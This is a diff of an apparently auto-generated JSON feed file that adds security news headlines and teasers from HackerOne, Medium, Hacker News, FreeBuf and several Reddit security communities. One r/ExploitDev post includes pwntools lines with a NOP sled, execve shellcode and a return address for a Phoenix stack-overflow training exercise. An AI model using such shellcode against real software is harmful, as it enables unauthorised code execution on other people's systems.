@@ -6,6 +6,16 @@
       "siteUrl": "http://h1.nobbd.de/",
       "articles": [
         {
+          "id": "https://hackerone.com/reports/1045644",
+          "author": null,
+          "description": "Mail.ru disclosed a bug submitted by mainteemoforfun: https://hackerone.com/reports/1045644",
+          "link": "https://hackerone.com/reports/1045644",
+          "publishedOn": "2022-03-05T08:15:50.000Z",
+          "wordCount": null,
+          "title": "unclaimed subdomain special.rkeeper.ru  to takeover from tilda.cc",
+          "imageUrl": null
+        },
+        {
           "id": "https://hackerone.com/reports/1470076",
           "author": null,
           "description": "Lark Technologies disclosed a bug submitted by aishkendle: https://hackerone.com/reports/1470076 - Bounty: $500",
@@ -4371,6 +4381,106 @@
       "feedUrl": "https://medium.com/feed/tag/bugbounty",
       "siteUrl": "https://medium.com/tag/bugbounty/latest?source=rss------bugbounty-5",
       "articles": [
+        {
+          "id": "https://medium.com/p/8f043abda799",
+          "author": "Manas Harsh",
+          "description": "These days bug bounty hunters have been finding many low hanging fruits and a lot of them want to go beyond those bugs. This blog is for…\nContinue reading on InfoSec Write-ups »",
+          "link": "https://infosecwriteups.com/going-beyond-the-surface-vulns-that-pay-well-8f043abda799?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-06T17:31:26.000Z",
+          "wordCount": null,
+          "title": "Going beyond the surface: Vulns that pay well",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/553c3afbc497",
+          "author": "Manan Aggarwal",
+          "description": "Hello Myself Manan Aggarwal a student from the BTech CSE is here to Present you the Blog about the All About the Access Control Part-1…\nContinue reading on Medium »",
+          "link": "https://medium.com/@mananaggarwal2001/all-about-access-control-part-1-553c3afbc497?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-06T15:48:01.000Z",
+          "wordCount": null,
+          "title": "All About Access Control Part-1",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/c1e7580213b9",
+          "author": "Gökhan Güzelkokar",
+          "description": "Hi all, I hope all is well. In this story, I’ll explain an idor bug which I found in a private bug bounty program. This story will very…\nContinue reading on Medium »",
+          "link": "https://medium.com/@gguzelkokar.mdbf15/a-short-story-of-idor-for-your-perspective-c1e7580213b9?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-06T13:13:24.000Z",
+          "wordCount": null,
+          "title": "A short story of IDOR for your perspective",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/c6313b113f5",
+          "author": "Md. Nur Habib",
+          "description": "An automated SSRF finder. Just give the domain name and your server and chill! ;) It also has options to find XSS and open redirects.\nContinue reading on Medium »",
+          "link": "https://medium.com/@thenurhabib/ssrfire-an-automated-ssrf-finder-c6313b113f5?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-06T12:48:35.000Z",
+          "wordCount": null,
+          "title": "SSRFire - an automated SSRF finder",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/87548ef7a0ba",
+          "author": "Arvind",
+          "description": "Bypassing biometric authentication just by making a call and access the app completely\nContinue reading on InfoSec Write-ups »",
+          "link": "https://infosecwriteups.com/whatsapp-bug-bounty-bypassing-biometric-authentication-using-voip-87548ef7a0ba?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-06T11:58:23.000Z",
+          "wordCount": null,
+          "title": "WhatsApp Bug Bounty: Bypassing biometric authentication using voip",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/81f4f855ebb7",
+          "author": "Akash0x0",
+          "description": "Hello, Security Guys & Hacker In this Write Up I am Going to tell you about\nContinue reading on Medium »",
+          "link": "https://akash0x0.medium.com/hof-in-3-minute-using-low-hanging-fruits-81f4f855ebb7?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-06T08:52:00.000Z",
+          "wordCount": null,
+          "title": "HOF In 3 Minute Using Low Hanging Fruits",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/e1a250acb003",
+          "author": "MikeChan",
+          "description": "This is a short story about my recent bug hunting on a private program. This program mainly relies on OTP to check user’s authentication…\nContinue reading on Techiepedia »",
+          "link": "https://medium.com/techiepedia/response-manipulation-leads-to-account-takeover-e1a250acb003?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-06T07:47:54.000Z",
+          "wordCount": null,
+          "title": "Response Manipulation leads to Account Takeover",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/64c94c702a7c",
+          "author": "Hackt3r",
+          "description": "Let us learn some P4 bugs\nContinue reading on Medium »",
+          "link": "https://medium.com/@sathvika03/weak-registration-implementation-64c94c702a7c?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-06T03:53:43.000Z",
+          "wordCount": null,
+          "title": "Weak Registration Implementation",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/d456705693c7",
+          "author": "Navdeep Khubber",
+          "description": "Cloudflare supports more than 16 million Internet attributes and is now one of the most popular WAFs(Web Application Firewalls). A year…\nContinue reading on Medium »",
+          "link": "https://navdeepkhubber.medium.com/cloudflare-waf-bypass-via-origin-ip-d456705693c7?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-05T16:29:20.000Z",
+          "wordCount": null,
+          "title": "Cloudflare WAF bypass via Origin IP",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/723361febfaf",
+          "author": "Ruben (Hacker_Yogi)",
+          "description": "what is Xml-RPC?\nContinue reading on Medium »",
+          "link": "https://medium.com/@Hacker_Yogi/bug-bounty-open-xmlrpc-php-vulnerability-on-wordpress-site-723361febfaf?source=rss------bugbounty-5",
+          "publishedOn": "2022-03-05T15:00:59.000Z",
+          "wordCount": null,
+          "title": "Bug Bounty: Open Xmlrpc.php vulnerability on WordPress site.",
+          "imageUrl": null
+        },
         {
           "id": "https://medium.com/p/92c04ff13b57",
           "author": "Arif ARI",
@@ -8903,6 +9013,16 @@
       "siteUrl": "https://medium.com/tag/redteam/latest?source=rss------redteam-5",
       "articles": [
         {
+          "id": "https://medium.com/p/eeda3e13e2a0",
+          "author": "Rabbit",
+          "description": "Signature based intrusion detection or prevention systems, will detect malicious activity through a predefined signature. If a Red Team…\nContinue reading on Medium »",
+          "link": "https://r4bb1t.medium.com/evading-network-defense-with-protocol-manipulation-eeda3e13e2a0?source=rss------redteam-5",
+          "publishedOn": "2022-03-06T12:54:21.000Z",
+          "wordCount": null,
+          "title": "Evading Network Defense with Protocol Manipulation",
+          "imageUrl": null
+        },
+        {
           "id": "https://medium.com/p/112aed524ad",
           "author": "Allen Butler",
           "description": "This post outlines techniques to exfiltrate files using curl and encode, encrypt, and save captured files using a custom Flask Web Server\nContinue reading on Maveris Labs »",
@@ -11290,6 +11410,56 @@
       "feedUrl": "https://medium.com/feed/tag/osint",
       "siteUrl": "https://medium.com/tag/osint/latest?source=rss------osint-5",
       "articles": [
+        {
+          "id": "https://medium.com/p/44c679227945",
+          "author": "OSINT Canada",
+          "description": "In light of the current events occurring in Ukraine now would be a good time to:\nContinue reading on Medium »",
+          "link": "https://medium.com/@mark_15281/march-osint-musings-44c679227945?source=rss------osint-5",
+          "publishedOn": "2022-03-07T00:58:02.000Z",
+          "wordCount": null,
+          "title": "March OSINT Musings",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/33ea619f9a94",
+          "author": "Nasrin",
+          "description": "Telegram’da Putin yanlısı kanallar arıyordum, Google Dork’u kullanma. Bunun da Google hacking’i kullanmanın pratik bir örneği olduğunu…\nContinue reading on Medium »",
+          "link": "https://medium.com/@ghassemiN/telegram-kanallar%C4%B1nda-arama-yapmak-i%C3%A7in-google-hackkingi-kullanmak-33ea619f9a94?source=rss------osint-5",
+          "publishedOn": "2022-03-06T23:49:03.000Z",
+          "wordCount": null,
+          "title": "Telegram kanallarında arama yapmak için Google hacking’i kullanmak",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/9cbb3519ea47",
+          "author": "dinesh Kumar",
+          "description": "Open source intelligence is a vital task for the red team and blue team alike. Here are some of the most useful OSINT tools.\nContinue reading on Medium »",
+          "link": "https://0xtmux.medium.com/10-osint-tools-hackers-need-to-know-about-9cbb3519ea47?source=rss------osint-5",
+          "publishedOn": "2022-03-06T17:42:14.000Z",
+          "wordCount": null,
+          "title": "10 OSINT Tools Hackers Need to Know About",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/31fba2d3cdfb",
+          "author": "CyberRaya",
+          "description": "Automatic Free Crawler By Google\nContinue reading on Medium »",
+          "link": "https://medium.com/@CyberRaya/send-google-alert-to-slack-31fba2d3cdfb?source=rss------osint-5",
+          "publishedOn": "2022-03-06T14:48:12.000Z",
+          "wordCount": null,
+          "title": "Send Google Alert To Slack",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/3aa7ac49f9ba",
+          "author": "Michael Mancuso",
+          "description": "Final Recon is a fast and simple python script for web reconnaissance. It follows a modular structure so in future new modules can be…\nContinue reading on Medium »",
+          "link": "https://medium.com/@mancusomjm/final-recon-osint-tool-for-all-in-one-web-reconnaissance-3aa7ac49f9ba?source=rss------osint-5",
+          "publishedOn": "2022-03-06T03:08:19.000Z",
+          "wordCount": null,
+          "title": "Final Recon — OSINT Tool for All-In-One Web Reconnaissance",
+          "imageUrl": null
+        },
         {
           "id": "https://medium.com/p/a50097233f06",
           "author": "Nasrin",
@@ -13738,6 +13908,26 @@
       "siteUrl": "http://windowsir.blogspot.com/",
       "articles": [
         {
+          "id": "tag:blogger.com,1999:blog-9518042.post-162465406769525469",
+          "author": "noreply@blogger.com (Unknown)",
+          "description": "My previous post on this topic presented my thoughts on how the concept of \"artifact categories\" were being misused.\nMy engagement with artifact categories goes back to 2013, when Corey Harrell implemented his thoughts on categories via auto_rip. I saw, and continue to see, the value in identifying artifact categories, but as I alluded to in my previous post, it really seems that the categories are being misused. Where the artifacts should be viewed as providing an indication of the categories and requiring further analysis (including, but not limited to the population of artifact constellations), instead, the artifacts are often misinterpreted as being emphatic statements of the event or condition occurring. For example, while an entry in the ShimCache or AmCache.hve file should indicate …",
+          "link": "http://windowsir.blogspot.com/2022/03/the-misuse-of-artifact-categories-pt-ii.html",
+          "publishedOn": "2022-03-06T12:50:00.000Z",
+          "wordCount": null,
+          "title": "The (Mis)Use of Artifact Categories, pt II",
+          "imageUrl": null
+        },
+        {
+          "id": "tag:blogger.com,1999:blog-9518042.post-6884963457139744928",
+          "author": "noreply@blogger.com (Unknown)",
+          "description": "A request that's been pretty consistent within the industry over time has had to do with reporting. I'd see a request, some responses, someone might ask for a template, and then the exchange would die off...I assumed that it had moved to DMs or offline. Then you'd see the discussion pop up again later, in some other forum.\nI get it...writing is hard. I have the benefit of having had to write throughout my career, but also of putting intentional, dedicated effort into DFIR reporting, in that I had been very purposeful in seeking feedback from my boss, and incorporating that feedback into report writing. I was able to get to the point of having reports approved with minimal (if any) changes pretty quickly. \nAs a result, in 2014, Windows Forensic Analysis Toolkit 4/e was published, and in thi…",
+          "link": "http://windowsir.blogspot.com/2022/03/dfir-reporting.html",
+          "publishedOn": "2022-03-06T12:41:00.000Z",
+          "wordCount": null,
+          "title": "DFIR Reporting",
+          "imageUrl": null
+        },
+        {
           "id": "tag:blogger.com,1999:blog-9518042.post-6764004818345276649",
           "author": "noreply@blogger.com (Unknown)",
           "description": "Very often in DFIR, we categorize artifacts in an easy-to-understand and easy-to-digest manner, as using or relying on these categories often helps us navigate our investigations. There are also times when we reduce those artifacts to a level where they're easier to understand, and in doing so, the categorization of the artifact isn't quite accurate. As such, it's necessary now and again to go back and take a look at that categorization to determine if still holds, or if it truly served the community in the manner intended.\nSPOILER ALERT - TL:DR \nWithin the DFIR community, we should not be hanging investigation findings on single artifacts in isolation. If there are gaps in data, they need to be recognized, understood and communicated. Do not spackle those gaps over with guesswork and assu…",
@@ -14538,6 +14728,26 @@
       "siteUrl": "https://news.ycombinator.com/newest",
       "articles": [
         {
+          "id": "https://news.ycombinator.com/item?id=30577267",
+          "author": "based2",
+          "description": "Article URL: https://lists.apache.org/list?announce@apache.org:2022-3\nComments URL: https://news.ycombinator.com/item?id=30577267\nPoints: 3\n# Comments: 0",
+          "link": "https://lists.apache.org/list?announce@apache.org:2022-3",
+          "publishedOn": "2022-03-06T12:53:38.000Z",
+          "wordCount": null,
+          "title": "CVE-2022-25312: An XML external entity (XXE) injection vulnerability exists I",
+          "imageUrl": null
+        },
+        {
+          "id": "https://news.ycombinator.com/item?id=30564782",
+          "author": "neustradamus",
+          "description": "Article URL: https://github.com/libexpat/libexpat/blob/R_2_4_7/expat/Changes\nComments URL: https://news.ycombinator.com/item?id=30564782\nPoints: 1\n# Comments: 0",
+          "link": "https://github.com/libexpat/libexpat/blob/R_2_4_7/expat/Changes",
+          "publishedOn": "2022-03-05T06:04:28.000Z",
+          "wordCount": null,
+          "title": "Expat library: libexpat 2.4.7 (CVE fixes)",
+          "imageUrl": null
+        },
+        {
           "id": "https://news.ycombinator.com/item?id=30557143",
           "author": "LinuxBender",
           "description": "Article URL: https://packetstormsecurity.com/files/166208/pfSense-2.5.2-Shell-Upload.html\nComments URL: https://news.ycombinator.com/item?id=30557143\nPoints: 10\n# Comments: 0",
@@ -15242,6 +15452,26 @@
       "feedUrl": "https://hnrss.org/newest?q=vulnerability",
       "siteUrl": "https://news.ycombinator.com/newest",
       "articles": [
+        {
+          "id": "https://news.ycombinator.com/item?id=30577267",
+          "author": "based2",
+          "description": "Article URL: https://lists.apache.org/list?announce@apache.org:2022-3\nComments URL: https://news.ycombinator.com/item?id=30577267\nPoints: 3\n# Comments: 0",
+          "link": "https://lists.apache.org/list?announce@apache.org:2022-3",
+          "publishedOn": "2022-03-06T12:53:38.000Z",
+          "wordCount": null,
+          "title": "CVE-2022-25312: An XML external entity (XXE) injection vulnerability exists I",
+          "imageUrl": null
+        },
+        {
+          "id": "https://news.ycombinator.com/item?id=30566774",
+          "author": "belter",
+          "description": "Article URL: https://www.theguardian.com/commentisfree/2022/mar/05/uks-vulnerability-to-corruption-uncovered-amid-slow-sanctions-response\nComments URL: https://news.ycombinator.com/item?id=30566774\nPoints: 9\n# Comments: 0",
+          "link": "https://www.theguardian.com/commentisfree/2022/mar/05/uks-vulnerability-to-corruption-uncovered-amid-slow-sanctions-response",
+          "publishedOn": "2022-03-05T12:04:58.000Z",
+          "wordCount": null,
+          "title": "UK’s vulnerability to corruption uncovered amid slow sanctions response",
+          "imageUrl": null
+        },
         {
           "id": "https://news.ycombinator.com/item?id=30556188",
           "author": "zelivans",
@@ -16288,6 +16518,16 @@
       "siteUrl": "https://www.freebuf.com",
       "articles": [
         {
+          "id": "https://www.freebuf.com/news/323908.html",
+          "author": null,
+          "description": "英伟达发布了一份报告，承认攻击者从其系统中窃取了员工密码和未披露的英伟达专有信息。",
+          "link": "https://www.freebuf.com/news/323908.html",
+          "publishedOn": "2022-03-05T08:10:42.000Z",
+          "wordCount": null,
+          "title": "FreeBuf早报 | 英伟达71000名员工凭证泄露 ；政协委员建议设立网络安全和数据保护窗口",
+          "imageUrl": null
+        },
+        {
           "id": "https://www.freebuf.com/news/323844.html",
           "author": null,
           "description": "总结推荐本周的热点资讯、优质文章和省心工具，保证大家不错过本周的每一个重点！",
@@ -16388,6 +16628,16 @@
           "imageUrl": null
         },
         {
+          "id": "https://www.freebuf.com/articles/network/323701.html",
+          "author": null,
+          "description": "给积极防御人员的对手交战指导建议",
+          "link": "https://www.freebuf.com/articles/network/323701.html",
+          "publishedOn": "2022-03-03T03:03:44.000Z",
+          "wordCount": null,
+          "title": "MITRE对手交战框架V1及一系列落地指导文件发布",
+          "imageUrl": null
+        },
+        {
           "id": "https://www.freebuf.com/news/323819.html",
           "author": null,
           "description": "3月2日上午，为期两天的「CIS 2021网络安全创新大会Spring·春日版」在上海宝华万豪酒店开启线下录制。",
@@ -16425,6 +16675,16 @@
           "publishedOn": "2022-03-03T02:21:30.000Z",
           "wordCount": null,
           "title": "APT29 以疫情为话题攻击大使馆相关人员",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.freebuf.com/articles/network/323690.html",
+          "author": null,
+          "description": "IcedID 是最早在 2017 年被披露的模块化银行木马，也是近年来最流行的恶意软件家族之一。",
+          "link": "https://www.freebuf.com/articles/network/323690.html",
+          "publishedOn": "2022-03-03T02:17:50.000Z",
+          "wordCount": null,
+          "title": "模块化银行木马IcedID 新变种浮出水面",
           "imageUrl": null
         },
         {
@@ -21684,6 +21944,26 @@
       "siteUrl": "http://www.sec-wiki.com/",
       "articles": [
         {
+          "id": "http://www.sec-wiki.com/?2022-03-06",
+          "author": null,
+          "description": "今日暂未更新资讯~\n更多最新文章，请访问SecWiki",
+          "link": "http://www.sec-wiki.com/?2022-03-06",
+          "publishedOn": "2022-03-06T15:58:20.000Z",
+          "wordCount": null,
+          "title": "SecWiki News 2022-03-06 Review",
+          "imageUrl": null
+        },
+        {
+          "id": "http://www.sec-wiki.com/?2022-03-05",
+          "author": null,
+          "description": "高效挖掘反序列化漏洞——GadgetInspector改造  by ourren\njs安全之ast混淆   by ourren\n基于openresty的安全网关开发记录  by ourren\n更多最新文章，请访问SecWiki",
+          "link": "http://www.sec-wiki.com/?2022-03-05",
+          "publishedOn": "2022-03-05T15:58:20.000Z",
+          "wordCount": null,
+          "title": "SecWiki News 2022-03-05 Review",
+          "imageUrl": null
+        },
+        {
           "id": "http://www.sec-wiki.com/?2022-03-04",
           "author": null,
           "description": "Mnemosyne：一个高效的水坑攻击调查取证系统  by ourren\nGoDLP: 敏感信息保护系统  by ourren\nMake JDBC Attacks Brilliant Again 番外篇  by ourren\nAttack Flow — Beyond Atomic Behaviors   by ourren\n更多最新文章，请访问SecWiki",
@@ -22448,6 +22728,66 @@
       "feedUrl": "https://www.reddit.com/r/asknetsec/.rss",
       "siteUrl": "https://www.reddit.com/r/asknetsec/",
       "articles": [
+        {
+          "id": "https://www.reddit.com/r/AskNetsec/comments/t893tc/help_with_making_money/",
+          "author": null,
+          "description": "Hey everyone\n I would like to join the security game. i have a background in programming, how computers and software works\n what is the fastest way to make money in the security field?\n I'm here not only for money i really like this field but i need to make money fast i have pills to pay and i can't get a job\n appreciate any help and guide\n    submitted by    /u/timet0fly  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/AskNetsec/comments/t893tc/help_with_making_money/",
+          "publishedOn": "2022-03-06T21:38:11.000Z",
+          "wordCount": null,
+          "title": "help with making money",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/AskNetsec/comments/t8714c/alienvault_ossim_step_by_step_tuning_after/",
+          "author": null,
+          "description": "Hi there,\n I'm interested to test this SIEM for education purposes. I downloaded the latest version from the official site and installed it on my VMware. \n But I stumbled upon the fact that I do not fully understand how best to configure everything. I did not find any deep step-by-step documentation on the official portal.\n And most likely I can miss a lot through undetailed documentation.\n Do I understand correctly that Suricata works out of the box? I don't need to install an agent on a Windows host?\n When I installed HIDS on my Windows host, I had a lot of weird events where the destination IP is displayed - 0.0.0.0. And I don't even know how to make a rule, so these events are not reflected. I googled and other people had such problems and there is no solution. \n Who works a lot with this SIEM, perhaps from your experience, you could share recommendations on what to do, what to do after installing this SIEM.\n I also haven't fully figured out how to run FIM.\n    submitted by    /u/athanielx  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/AskNetsec/comments/t8714c/alienvault_ossim_step_by_step_tuning_after/",
+          "publishedOn": "2022-03-06T20:02:07.000Z",
+          "wordCount": null,
+          "title": "AlienVault OSSIM - Step by Step Tuning after Installation",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/AskNetsec/comments/t83joj/is_it_possible_to_be_hacked_by_private/",
+          "author": null,
+          "description": "I believe my neighbors are watching me using private networks. I have have an app that shows hidden SSIDs. I think they are using these networks to see and listen to what I'm doing on my devices.\n    submitted by    /u/AshuraSenkuu  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/AskNetsec/comments/t83joj/is_it_possible_to_be_hacked_by_private/",
+          "publishedOn": "2022-03-06T17:23:01.000Z",
+          "wordCount": null,
+          "title": "Is it possible to be hacked by private networks/hidden SSIDS near your area?",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/AskNetsec/comments/t7vt2g/potential_driveby_0click_0day_on_chrome/",
+          "author": null,
+          "description": "There is an on going bug in chrome that allows attackers to download files in the background into the victims machine without triggering any gui updates, I first experienced this about two moths ago when I was trying to close the browser only to be interrupted by a chrome prompt informing me that there are ongoing downloads in the background that weren't started by me and display no sign of the downloading process on chrome's gui. I was a bit alarmed but I didn't pay it too much attention.\n Then I got curious when yesterday I had the same experience again, this time obviously I clicked 'continue downloads', I was taken to chrome download page where I found that chrome had intercepted and flagged a 'malicious file' and it was offering me to either 'keep' or 'discard' said file, regrettably …",
+          "link": "https://www.reddit.com/r/AskNetsec/comments/t7vt2g/potential_driveby_0click_0day_on_chrome/",
+          "publishedOn": "2022-03-06T10:08:17.000Z",
+          "wordCount": null,
+          "title": "Potential drive-by 0-click 0-day on chrome",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/AskNetsec/comments/t7erm4/question_about_protecting_my_data_while_traveling/",
+          "author": null,
+          "description": "Traveling a lot this week and was just wondering what kind of vpn you guys use while traveling and any other security measures you may have :)\n    submitted by    /u/Savage-shredder  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/AskNetsec/comments/t7erm4/question_about_protecting_my_data_while_traveling/",
+          "publishedOn": "2022-03-05T17:48:35.000Z",
+          "wordCount": null,
+          "title": "Question about protecting my data while traveling .",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/AskNetsec/comments/t784qc/good_us_based_infosec_recruiters/",
+          "author": null,
+          "description": "I never thought I would say this, normally being on the hiring side, but has anyone had positive experience for US-based boutique infosec recruiters that they would recommend? I’ve found several listed in CISO magazine and such but don’t know if any are particularly clue-full. Public or DM is fine, thanks!\n    submitted by    /u/venerable4bede  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/AskNetsec/comments/t784qc/good_us_based_infosec_recruiters/",
+          "publishedOn": "2022-03-05T12:06:59.000Z",
+          "wordCount": null,
+          "title": "Good US based infosec recruiters?",
+          "imageUrl": null
+        },
         {
           "id": "https://www.reddit.com/r/AskNetsec/comments/t6paje/does_bluetooth_create_a_vulnerability_for_the/",
           "author": null,
@@ -26674,6 +27014,16 @@
       "siteUrl": "https://www.reddit.com/r/redteamsec/",
       "articles": [
         {
+          "id": "https://www.reddit.com/r/redteamsec/comments/t77irh/plugins_for_persistence_sublime_text_vs_code/",
+          "author": null,
+          "description": "submitted by    /u/hanbei-undying  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/redteamsec/comments/t77irh/plugins_for_persistence_sublime_text_vs_code/",
+          "publishedOn": "2022-03-05T11:25:58.000Z",
+          "wordCount": null,
+          "title": "Plugins for Persistence (Sublime Text & VS Code)",
+          "imageUrl": null
+        },
+        {
           "id": "https://www.reddit.com/r/redteamsec/comments/t5y5j4/a_case_study_defending_against_ransomware_with/",
           "author": null,
           "description": "submitted by    /u/SCI_Rusher  \n [link]   [comments]",
@@ -27873,6 +28223,26 @@
       "siteUrl": "https://www.reddit.com/r/exploitdev/",
       "articles": [
         {
+          "id": "https://www.reddit.com/r/ExploitDev/comments/t85peb/frelatage_a_new_coveragebased_python_fuzzing/",
+          "author": null,
+          "description": "Hello everyone !\n I am a 21 year old french cybersecurity enthusiast and I would like to share with you Frelatage, which is a tool I wrote ! It is a coverage-based Python fuzzing library which can be used to fuzz python code. The development of Frelatage was inspired by various other fuzzers, including AFL/AFL++, Atheris and PyFuzzer.The main purpose of the project is to take advantage of the best features of these fuzzers and gather them together into a new tool in order to efficiently fuzz python applications.\n Please note that the project is still in early alpha, and its development is very active, so any advice or suggestion is welcomed !\n Install: https://github.com/Rog3rSm1th/Frelatage\n https://i.redd.it/m88potyk9tl81.gif\n    submitted by    /u/FrenchFuzzer  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/ExploitDev/comments/t85peb/frelatage_a_new_coveragebased_python_fuzzing/",
+          "publishedOn": "2022-03-06T19:00:56.000Z",
+          "wordCount": null,
+          "title": "Frelatage: A new Coverage-Based Python fuzzing library",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/ExploitDev/comments/t7qa3f/shellcode_buff_overflow_question/",
+          "author": null,
+          "description": "As I was going through protostar Phoenix Stack overflows I came across something on the Stack-Five exercise that I don't quite understand on amd64. https://exploit.education/phoenix/stack-five/\n Basically I can get the exploit to work when the nop sled is 80 characters long but when I have it 88 characters long I get a seg fault.\n This Works\n t.sendline('\\x90'*80 + '\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05' + 'h'*29 + pwn.p64(0x7fffffffe5d0))\n ​\n This gives a segfault\n t.sendline('\\x90'*88 + '\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05' + 'h'*21 + pwn.p64(0x7fffffffe5d0))\n ​\n Does anyone know why the second one doesn't work?\n    submitted by    /u/Jasonsaccount  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/ExploitDev/comments/t7qa3f/shellcode_buff_overflow_question/",
+          "publishedOn": "2022-03-06T03:45:54.000Z",
+          "wordCount": null,
+          "title": "Shellcode Buff Overflow Question",
+          "imageUrl": null
+        },
+        {
           "id": "https://www.reddit.com/r/ExploitDev/comments/t42uf3/windows_exploitation_research/",
           "author": null,
           "description": "Hi, I am starting windows security research to understand how windows internals works and how one can exploit it. If anyone interested he/she can DM me\n    submitted by    /u/i_whiteheart  \n [link]   [comments]",
@@ -28362,6 +28732,46 @@
       "siteUrl": "https://www.reddit.com/r/computerforensics/",
       "articles": [
         {
+          "id": "https://www.reddit.com/r/computerforensics/comments/t7zlim/unrecoverable_and_recoverable_windows_file/",
+          "author": null,
+          "description": "In my forensic image, some deleted files I can recover, some can not. How Encase determine which files are not recoverable internally? For data carving, how Encase retrieve internally those files, are they use same techniques compared with recover deleted files? thanks.\n    submitted by    /u/cyberfo  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/computerforensics/comments/t7zlim/unrecoverable_and_recoverable_windows_file/",
+          "publishedOn": "2022-03-06T14:13:58.000Z",
+          "wordCount": null,
+          "title": "Unrecoverable and recoverable windows file",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/computerforensics/comments/t7zdqy/xways_linux_image_analysis/",
+          "author": null,
+          "description": "in X-ways, if I browse the root directory of image, i found free space, idle space and slack space, can anyone explain what's the different among these these three spaces?\n in filter attribute， there are SUID/SGID, symlink and special file. I thought suid file are special file, what are the special file X-ways refer to ? symlink means hardlink or soft link?\n    submitted by    /u/cyberfo  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/computerforensics/comments/t7zdqy/xways_linux_image_analysis/",
+          "publishedOn": "2022-03-06T14:03:08.000Z",
+          "wordCount": null,
+          "title": "X-ways linux image analysis",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/computerforensics/comments/t7bov7/how_to_collect_a_forensic_image_of_a_vsxiexsi/",
+          "author": null,
+          "description": "How to collect a forensic image of a VSXI/EXSI that has been infected with ransomware?\n    submitted by    /u/rvndomus3r2019  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/computerforensics/comments/t7bov7/how_to_collect_a_forensic_image_of_a_vsxiexsi/",
+          "publishedOn": "2022-03-05T15:23:58.000Z",
+          "wordCount": null,
+          "title": "How to collect a forensic image of a VSXI/EXSI that has been infected with ransomware?",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/computerforensics/comments/t79kxb/copying_hard_drive/",
+          "author": null,
+          "description": "I am sending a hard drive I own into Cyber Forensics. If possible, I am looking for software advice to copy the hard drive before sending it in to experts. Additionally, if you have advice for transferring the files from the software to a type of hardware, I would appreciate it. \n ​\n Thanks.\n    submitted by    /u/Odd-Switch-1658  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/computerforensics/comments/t79kxb/copying_hard_drive/",
+          "publishedOn": "2022-03-05T13:35:33.000Z",
+          "wordCount": null,
+          "title": "Copying Hard Drive",
+          "imageUrl": null
+        },
+        {
           "id": "https://www.reddit.com/r/computerforensics/comments/t6jau6/steps_to_run_before_analyzing_the_iphone_image/",
           "author": null,
           "description": "steps to run before forensic analyze: turn off screenlock, turn off backup, turn off find my iphone, what else?\n    submitted by    /u/cyberfo  \n [link]   [comments]",
@@ -28399,6 +28809,16 @@
           "publishedOn": "2022-03-04T00:18:17.000Z",
           "wordCount": null,
           "title": "Interesting",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/computerforensics/comments/t657ff/computer_workstation_question/",
+          "author": null,
+          "description": "Hello everyone, I know this has been asked before however I’m going to build a forensics workstation for my department; we don’t have a lot of money to throw around to do a dual CPU set up. I was wondering if anyone would recommend the newest I9-12900k CPU for processing, or any other processor for the most efficient in imaging. I mainly use Magnet Axiom and cellabrite. One thing I’m having trouble with is finding a good MOBO, what would you all recommend, I need enough ports for a write blocker and multiple HDDS, and M.2 SSD’s.\n Thanks\n    submitted by    /u/ExiisTT  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/computerforensics/comments/t657ff/computer_workstation_question/",
+          "publishedOn": "2022-03-03T23:50:00.000Z",
+          "wordCount": null,
+          "title": "Computer workstation question",
           "imageUrl": null
         },
         {
@@ -30062,6 +30482,36 @@
       "feedUrl": "https://www.reddit.com/r/netsec/.rss",
